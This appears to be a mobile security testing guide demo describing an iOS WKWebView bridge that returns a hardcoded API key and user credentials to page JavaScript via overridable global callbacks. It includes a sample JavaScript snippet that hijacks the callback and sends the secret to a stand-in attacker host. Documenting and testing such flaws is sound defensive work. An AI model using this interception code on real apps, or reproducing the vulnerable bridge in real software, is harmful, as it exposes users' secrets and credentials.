---
platform: ios
title: Sensitive Data Returned to Page JavaScript via evaluateJavaScript in a WKScriptMessageHandler
code: [swift]
id: MASTG-DEMO-0x02
test: MASTG-TEST-0x02
kind: fail
---

## Sample

This sample reuses the same vulnerable `WKWebView` setup from @MASTG-DEMO-0x01. The `SecretBridgeHandler` implementation handles two bridge actions (`getSecret` and `getCredentials`) and returns sensitive native data to JavaScript by calling `evaluateJavaScript:completionHandler:`, injecting the data directly into the page's JavaScript context via a global callback function.

Any JavaScript running in the page can override those callback functions before the native handler fires them:

```javascript
// Attacker overrides the callback to intercept the response
window.receiveSecret = function(secret) {
    fetch("https://attacker.example.com/?leak=" + secret);
};
// Then triggers the bridge as normal
window.webkit.messageHandlers.bridge.postMessage({action: 'getSecret'});
```

{{ ../MASTG-DEMO-0x01/MastgTest.swift }}

## Steps

1. Use @MASTG-TECH-0058 to extract the app. The main binary is `./Payload/MASTestApp.app/MASTestApp`.
2. Use @MASTG-TOOL-0073 with the `-i` option to run this script.

{{ evaluate_js_callback.r2 # run.sh }}

## Observation

The output shows all uses of the `evaluateJavaScript:completionHandler:` selector in the binary and the cross-references that identify the enclosing function.

{{ output.txt }}

## Evaluation

The test case fails because the app calls `evaluateJavaScript:completionHandler:` from within `SecretBridgeHandler.userContentController:didReceive:`, the `WKScriptMessageHandler` implementation, to inject sensitive data back into the page's JavaScript context.

Both xrefs point to `sym.MASTestApp.SecretBridgeHandler.userContentController.allocator.didReceive...`, confirming that both calls originate from the bridge handler:

1. Address `0x1698` corresponds to the `getSecret` case, which evaluates `window.receiveSecret(...)` containing a hardcoded API key.
2. Address `0x18ec` corresponds to the `getCredentials` case, which evaluates `window.receiveCredentials(...)` containing user credentials.

Because `receiveSecret` and `receiveCredentials` are plain global functions defined in the page context, any JavaScript running on the page can override them before the native handler fires, intercepting the sensitive values on their way back from native code. Refer to @MASTG-BEST-0x05 for the recommended alternative.
